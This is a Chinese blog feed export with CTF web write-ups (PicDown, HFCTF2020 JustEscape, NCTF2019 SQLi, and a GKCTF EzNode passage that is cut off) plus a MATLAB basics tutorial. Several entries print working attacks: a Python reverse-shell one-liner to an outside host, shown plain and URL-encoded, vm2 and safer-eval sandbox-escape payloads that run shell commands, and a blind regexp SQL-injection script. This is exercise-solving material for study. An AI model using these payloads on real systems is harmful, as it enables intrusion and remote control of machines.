src="/2020/10/28/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown//2.png"><br>感觉像是buu的环境出现了一点问题。。。flag就按非预期的传上去了。</p><h4 id="3-5"><a href="#3-5" class="headerlink" title="3.5"></a>3.5</h4><p>如果可以继续的话，可以进行下面的操作。</p><p>现在的buu靶机都能被外网访问了，所以就可以在自己的服务器上面监听了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9573</span><br></pre></td></tr></table></figure><p>然后被攻击端执行下面的命令就连上了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;a16ne.cn&#x27;,9573));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><h2 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=XqcW8IFne+2ARg76zHfHtFoBd8gVjeWoBhAo61EWVOQ=&amp;shell=python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;a16ne.cn&#x27;,9573));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=zgySafkqtdMW5uvibbmE/DEe+aS1hhNbqRa+rqSaavY=&amp;shell=%70%79%74%68%6F%6E%20%2D%63%20%22%69%6D%70%6F%72%74%20%6F%73%2C%73%6F%63%6B%65%74%2C%73%75%62%70%72%6F%63%65%73%73%3B%73%3D%73%6F%63%6B%65%74%2E%73%6F%63%6B%65%74%28%73%6F%63%6B%65%74%2E%41%46%5F%49%4E%45%54%2C%73%6F%63%6B%65%74%2E%53%4F%43%4B%5F%53%54%52%45%41%4D%29%3B%73%2E%63%6F%6E%6E%65%63%74%28%28%27%61%31%36%6E%65%2E%63%6E%27%2C%39%35%37%33%29%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%30%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%31%29%3B%6F%73%2E%64%75%70%32%28%73%2E%66%69%6C%65%6E%6F%28%29%2C%32%29%3B%70%3D%73%75%62%70%72%6F%63%65%73%73%2E%63%61%6C%6C%28%5B%27%2F%62%69%6E%2F%62%61%73%68%27%2C%27%2D%69%27%5D%29%3B%22</span><br></pre></td></tr></table></figure><p>写作业去了</p><blockquote><p>除了筷子，我真的什么都放得下。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> 遍历目录 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-JustEscape</title>
      <link href="/2020/10/28/HFCTF2020-JustEscape/"/>
      <url>/2020/10/28/HFCTF2020-JustEscape/</url>
      
        <content type="html"><![CDATA[<h2 id="1-获得提示与php代码"><a href="#1-获得提示与php代码" class="headerlink" title="1.获得提示与php代码"></a>1.获得提示与php代码</h2><p>提示有两个，第一个说是注意编码，意思就是他eval之前把<code>%2b</code>进行了url解码。第二个提示说<code>这是不是php呢？</code>意思就是<code>不是php</code>。</p><p>直接进入<code>/run.php</code>后获得以下的php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的内容意思就是给我们提供了一个可用于上传的参数。<br><strong>不会了，菜菜</strong></p><p>用<code>?code=Error().stack</code>可测试出用得是js<br><img src="/2020/10/28/HFCTF2020-JustEscape//2.png"><br>看看wp，用得是js的<code>sandbox</code>，名为<code>vm2</code>。<img src="/2020/10/28/HFCTF2020-JustEscape//1.png"><br>可供逃逸的<code>payload</code><a href="https://github.com/patriksimek/vm2/issues/225">ISSUE在这</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">code = &#x27;(&#x27; + function()&#123;</span><br><span class="line">TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">try&#123;</span><br><span class="line">Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">console.log(new VM().run(code));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-过滤绕过"><a href="#2-过滤绕过" class="headerlink" title="2.过滤绕过"></a>2.<code>过滤绕过</code></h2><p>主要过滤的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;process&#x27;, &#x27;exec&#x27;, &#x27;constructor&#x27;, &#x27;prototype&#x27;, &#x27;Function&#x27;, &#x27;&quot;&#x27;, &#x27;&#x27;&#x27;]</span><br></pre></td></tr></table></figure><p>可用以下方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">        prototype                /**用下面的内容来绕过(即变量拼接)，这种比较简单*/</span><br><span class="line">[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`]</span><br></pre></td></tr></table></figure><p>现在的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?code=(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="3-flag"><a href="#3-flag" class="headerlink" title="3.flag"></a>3.flag</h2><p>上传query参数即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d564d610-40d9-4b95-b652-32d5cb69bfca&#125;</span><br></pre></td></tr></table></figure><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">主要用到的有`vm2`沙箱逃逸的poc:</span><br><span class="line">?code=(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js绕过关键词过滤的方法:</span><br><span class="line">拼接变量绕过</span><br><span class="line">如过滤关键词`prototype`，则绕过方式为``$&#123;`$&#123;`prototyp`&#125;e`&#125;``</span><br></pre></td></tr></table></figure><blockquote><p>笑渐不闻声渐消，多情却被无情恼。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> vm2沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-SQLi</title>
      <link href="/2020/10/27/NCTF2019-SQLi/"/>
      <url>/2020/10/27/NCTF2019-SQLi/</url>
      
        <content type="html"><![CDATA[<h2 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>一看就知道是sql注入，首先没有注册按钮，其次下面有sql语句的提示。啊这。。</p><p><img src="/2020/10/27/NCTF2019-SQLi//1.png"></p><h2 id="2-regexp注入"><a href="#2-regexp注入" class="headerlink" title="2.regexp注入"></a>2.regexp注入</h2><p>看一下<code>robots.txt</code>，看到了提示<img src="/2020/10/27/NCTF2019-SQLi//2.png"><br>然后进入<code>hint.txt</code>看提示，获得以下的提示内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,</span><br><span class="line"></span><br><span class="line">Then you will get the flag;</span><br></pre></td></tr></table></figure><p>意思是想让我们获得管理员的密码就ok了。黑名单如下，也省得测试了。。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep</span><br></pre></td></tr></table></figure><p>然后可以知道没禁用<code>regexp语句</code>，还是白名单最安全，另外这个<code>regexp</code>真的sao，妹想到啊。。。</p><blockquote><p>regexp正则注入原理，看过师傅的wp还是自己试一下。</p></blockquote><p>看一下用户。<br><img src="/2020/10/27/NCTF2019-SQLi//3.png"></p><p>正则匹配成功会返回1<br><img src="/2020/10/27/NCTF2019-SQLi//4.png"></p><p>匹配失败后返回0<br><img src="/2020/10/27/NCTF2019-SQLi//5.png"></p><h2 id="3-注入测试"><a href="#3-注入测试" class="headerlink" title="3.注入测试"></a>3.注入测试</h2><p>原先的查询语句为<code>select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code><br>怎么构造可以执行我们想执行的语句呢？<br>若<code>username=\</code>将<code>&#39;</code>给转义为普通字符，第一个单引号就会和第三个单引号匹配。后面执行|| username 可正则匹配的*内容返回。<br>即构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=\</span><br><span class="line">passwd=|| /**/username/**/regexp/**/&quot;^admin&quot;;%00</span><br></pre></td></tr></table></figure><p>最后的<code>%00用来注释</code>绕过<code>&#39;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;\&#x27; and passwd=&#x27;|| /**/username/**/regexp/**/&quot;^&#123;&#125;&quot;;%00&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>注意在写python的时候，传入<code>%00</code>不能直接传入，直接传会解码直接为空，用<code>\x00</code>或者<code>chr(0)</code>可绕过。</p></blockquote><p>测试<br><img src="/2020/10/27/NCTF2019-SQLi//6.png"></p><h2 id="4-注入python脚本"><a href="#4-注入python脚本" class="headerlink" title="4.注入python脚本"></a>4.注入python脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">url = &quot;http://53321f67-0e98-440e-9e0d-bcdc4d70182f.node3.buuoj.cn/index.php&quot;</span><br><span class="line">str_list = &quot;_&quot; + string.ascii_lowercase + string.ascii_uppercase + string.digits  ## 枚举了几乎所有可能，_、大、小写ascii、和digits也就是数字。</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for n in range(100):</span><br><span class="line">print(n)</span><br><span class="line">for i in str_list:</span><br><span class="line">data = &#123;</span><br><span class="line">            &#x27;username&#x27;: &#x27;\\&#x27;, </span><br><span class="line">            &#x27;passwd&#x27;  : &#x27;||passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;\x00&#x27;.format(payload+i)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url = url, data = data)</span><br><span class="line"></span><br><span class="line">if &#x27;welcome.php&#x27; in res.text:</span><br><span class="line">payload += i</span><br><span class="line">print(payload)</span><br><span class="line">break</span><br><span class="line">elif res.status_code == 429:   #防止429访问过快</span><br><span class="line">time.sleep(1)</span><br></pre></td></tr></table></figure><p>获得passwd<code>you_will_never_know7788990</code>，第一次测错了，可能是脚本的原因，也可能是服务端的问题，目前搞不懂。</p><p><img src="/2020/10/27/NCTF2019-SQLi//7.png"></p><h2 id="5-flag"><a href="#5-flag" class="headerlink" title="5.flag"></a>5.flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;582abc6b-5f72-4a6a-ad54-f496db4baf79&#125;</span><br></pre></td></tr></table></figure><blockquote><p>人间是万象横看，竖成诗篇。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> regexp注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MATLAB安装，MATLAB使用经验(一)</title>
      <link href="/2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C/"/>
      <url>/2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<blockquote><p>争得与你一席并肩</p></blockquote><p>转载自<a href="https://blog.csdn.net/qq_39233184/article/details/106838870">MATLAB安装经验</a></p><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p>懒得写了。</p><h2 id="2-安装前需知"><a href="#2-安装前需知" class="headerlink" title="2.安装前需知"></a>2.安装前需知</h2><p>2.1）安装全程须断网，否则易安装不成功；</p><p>2.2）安装前先关闭360、电脑管家等所有杀毒软件，防止误杀补丁，导致安装失败；</p><p>2.3）Matlab2020a仅适用于Win7&#x2F;10（64位）系统，亲测可用！</p><p>2.4）安装Matlab2020a要求计算机名和用户名非中文，否则安装后无法正常打开；</p><h2 id="3-安装步骤"><a href="#3-安装步骤" class="headerlink" title="3.安装步骤"></a>3.安装步骤</h2><p>…省略了，懒得写自己看吧。</p><h1 id="怎么使用"><a href="#怎么使用" class="headerlink" title="怎么使用"></a>怎么使用</h1><h2 id="1-各种变量"><a href="#1-各种变量" class="headerlink" title="1.各种变量"></a>1.各种变量</h2><h3 id="1-向量"><a href="#1-向量" class="headerlink" title="(1).向量"></a>(1).向量</h3><h4 id="lt-1-gt-行向量"><a href="#lt-1-gt-行向量" class="headerlink" title="&lt;1&gt;.行向量"></a>&lt;1&gt;.行向量</h4><p>创建方式<code>x = [1, 2, 3, 4, 5]</code>，出来的就是横着的<code>行向量</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x =</span><br><span class="line"></span><br><span class="line">          1.00          2.00          3.00          4.00          5.00</span><br></pre></td></tr></table></figure><h4 id="lt-2-gt-列向量"><a href="#lt-2-gt-列向量" class="headerlink" title="&lt;2&gt;.列向量"></a>&lt;2&gt;.列向量</h4><p>创建方式<code>x = [1; 2; 3; 4; 5]</code>，出来的就是竖着的<code>列向量</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">x =</span><br><span class="line"></span><br><span class="line">          1.00</span><br><span class="line">          2.00</span><br><span class="line">          3.00</span><br><span class="line">          4.00</span><br><span class="line">          5.00</span><br></pre></td></tr></table></figure><h3 id="2-矩阵"><a href="#2-矩阵" class="headerlink" title="(2).矩阵"></a>(2).矩阵</h3><p>创建一个<code>3v3</code>的矩阵方式如下<code>m = [1 2 3; 4 5 6; 7 8 9]</code>，出来的就是<code>3v3</code>的矩阵了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m =</span><br><span class="line"></span><br><span class="line">          1.00          2.00          3.00</span><br><span class="line">          4.00          5.00          6.00</span><br><span class="line">          7.00          8.00          9.00</span><br></pre></td></tr></table></figure><h2 id="2-命令"><a href="#2-命令" class="headerlink" title="2.命令"></a>2.命令</h2><h3 id="1-MATLAB管理会话的命令"><a href="#1-MATLAB管理会话的命令" class="headerlink" title="(1).MATLAB管理会话的命令"></a>(1).MATLAB管理会话的命令</h3><blockquote><p>命令目的&#x2F;作用<br>clc清除命令窗口。<br>clear从内存中删除变量。<br>exist检查存在的文件或变量。<br>global声明变量为全局。<br>help搜索帮助主题。<br>lookfor搜索帮助关键字条目。<br>quit停止MATLAB。<br>who列出当前变量。<br>whos列出当前变量（长显示）</p></blockquote><h3 id="2-MATLAB的系统命令"><a href="#2-MATLAB的系统命令" class="headerlink" title="(2).MATLAB的系统命令"></a>(2).MATLAB的系统命令</h3><blockquote><p>命令目的&#x2F;作用<br>cd改变当前目录。<br>date显示当前日期。<br>delete删除一个文件。<br>diary日记文件记录开&#x2F;关切换。<br>dir列出当前目录中的所有文件。<br>load负载工作区从一个文件中的变量。<br>path显示搜索路径。<br>pwd显示当前目录。<br>save保存在一个文件中的工作区变量。<br>type显示一个文件的​​内容。<br>what列出所有MATLAB文件在当前目录中。<br>wklread读取.wk1电子表格文件。 </p></blockquote><h3 id="3-MATLAB输入和输出命令"><a href="#3-MATLAB输入和输出命令" class="headerlink" title="(3).MATLAB输入和输出命令"></a>(3).MATLAB输入和输出命令</h3><blockquote><p>命令作用&#x2F;目的<br>disp显示一个数组或字符串的内容。<br>fscanf阅读从文件格式的数据。<br>format控制屏幕显示的格式。<br>fprintf执行格式化写入到屏幕或文件。<br>input显示提示并等待输入。<br>;禁止显示网版印刷</p></blockquote><p><strong>fscanf和fprintf命令的行为像C scanf和printf函数。他们支持格式如下代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式代码目的/作用</span><br><span class="line">%s输出字符串</span><br><span class="line">%d输出整数</span><br><span class="line">%f输出浮点数</span><br><span class="line">%e显示科学计数法形式</span><br><span class="line">%g%f 和%e 的结合，根据数据选择适当的显示方式</span><br></pre></td></tr></table></figure><h4 id="lt-1-gt-格式控制"><a href="#lt-1-gt-格式控制" class="headerlink" title="&lt;1&gt;.格式控制"></a>&lt;1&gt;.格式控制</h4><p><strong>用于数字显示格式的函数有以下几种形式：</strong></p><p>Format函数最多可显示<br>format short四位十进制数（默认）<br>format long15位定点表示<br>format short e五位浮点表示<br>format long e15位浮点表示<br>format bank两个十进制数字<br>format +正，负或零<br>format rat有理数近似<br>format compact变量之间没有空行<br>format loose变量之间有空行</p><h3 id="4-MATLAB向量，矩阵和阵列命令"><a href="#4-MATLAB向量，矩阵和阵列命令" class="headerlink" title="(4).MATLAB向量，矩阵和阵列命令"></a>(4).MATLAB向量，矩阵和阵列命令</h3><blockquote><p>命令作用&#x2F;目的<br>cat连接数组<br>find查找非零元素的索引<br>length计算元素数量<br>linspace创建间隔向量<br>logspace创建对数间隔向量<br>max返回最大元素<br>min返回最小元素<br>prod计算数组元素的连乘积<br>reshape重新调整矩阵的行数、列数、维数<br>size计算数组大小<br>sort排序每个列<br>sum每列相加<br>eye创建一个单位矩阵<br>ones生成全1矩阵<br>zeros生成零矩阵<br>cross计算矩阵交叉乘积<br>dot计算矩阵点积<br>det计算数组的行列式<br>inv计算矩阵的逆<br>pinv计算矩阵的伪逆<br>rank计算矩阵的秩<br>rref将矩阵化成行最简形<br>cell创建单元数组<br>celldisp显示单元数组<br>cellplot显示单元数组的图形表示<br>num2cell将数值阵列转化为异质阵列<br>deal匹配输入和输出列表<br>iscell判断是否为元胞类型 </p></blockquote><h3 id="5-MATLAB绘图命令"><a href="#5-MATLAB绘图命令" class="headerlink" title="(5).MATLAB绘图命令"></a>(5).MATLAB绘图命令</h3><blockquote><p>axis人功选择坐标轴尺寸<br>fplot智能绘图功能<br>grid显示网格线<br>plot生成XY图<br>print打印或绘图到文件<br>title把文字置于顶部<br>xlabel将文本标签添加到x轴<br>ylabel将文本标签添加到y轴<br>axes创建轴对象<br>close关闭当前的绘图<br>close all关闭所有绘图<br>figure打开一个新的图形窗口<br>gtext通过鼠标在指定位置放注文<br>hold保持当前图形<br>legend鼠标放置图例<br>refresh重新绘制当前图形窗口<br>set指定对象的属性，如轴<br>subplot在子窗口中创建图<br>text在图上做标记<br>bar创建条形图<br>loglog创建双对数图<br>polar创建极坐标图像<br>semilogx创建半对数图（对数横坐标）<br>semilogy创建半对数图（对数纵坐标）<br>stairs创建阶梯图<br>stem创建针状图</p></blockquote><h2 id="3-MATLAB的-M-文件"><a href="#3-MATLAB的-M-文件" class="headerlink" title="3.MATLAB的 M 文件"></a>3.MATLAB的 M 文件</h2><p>MATLAB允许写两个程序文件：<br>    <code>脚本 - 脚本文件 .m 扩展程序文件。在这些文件中写的一系列命令，想一起执行。脚本不接受输入和不返回任何输出。他们在工作区中的数据操作。</code><br>    <code>函数 - 函数文件 .m 扩展程序文件。函数可以接受输入和返回输出。内部变量是本地的函数。</code></p><p>可以在matlab的<code>&gt;&gt;</code>命令行里面输入以下命令创建<code>.m</code>脚本文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir progs    % create directory progs under default directory</span><br><span class="line">chdir progs    % changing the current directory to progs</span><br><span class="line">edit  prog1.m  % creating an m file named prog1.m</span><br></pre></td></tr></table></figure><p><img src="/2020/10/27/MATLAB%E5%AE%89%E8%A3%85%E7%BB%8F%E9%AA%8C//1.png"></p><p>可写入脚本文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = 5;</span><br><span class="line">b = 7;</span><br><span class="line">c = a + b;</span><br><span class="line">d = c + sin(b);</span><br><span class="line">e = 5 * d;</span><br><span class="line">f = exp(-d);</span><br></pre></td></tr></table></figure><p>在上面运行，可以看到右侧工作区的键值对改变了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 经验 </tag>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzNode</title>
      <link href="/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/"/>
      <url>/2020/10/27/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SB, I FUCKING LOVE YOU</p></blockquote><h2 id="1-提示"><a href="#1-提示" class="headerlink" title="1.提示"></a>1.提示</h2><p>一共有两个提示，下面分别列出来</p><h3 id="1-版本"><a href="#1-版本" class="headerlink" title="1.版本"></a>1.版本</h3><p>这是第一个提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;src&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;index.js&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;MIT&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;body-parser&quot;: &quot;1.19.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;4.17.1&quot;,</span><br><span class="line">    &quot;safer-eval&quot;: &quot;1.3.6&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>&quot;safer-eval&quot;: &quot;1.3.6&quot;</code>这个版本有漏洞，<a href="https://github.com/commenthol/safer-eval/issues/10">沙箱逃逸</a><br>这里的payload可以为以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function = (function () &#123;</span><br><span class="line">  const process = clearImmediate.constructor(&quot;return process;&quot;)();</span><br><span 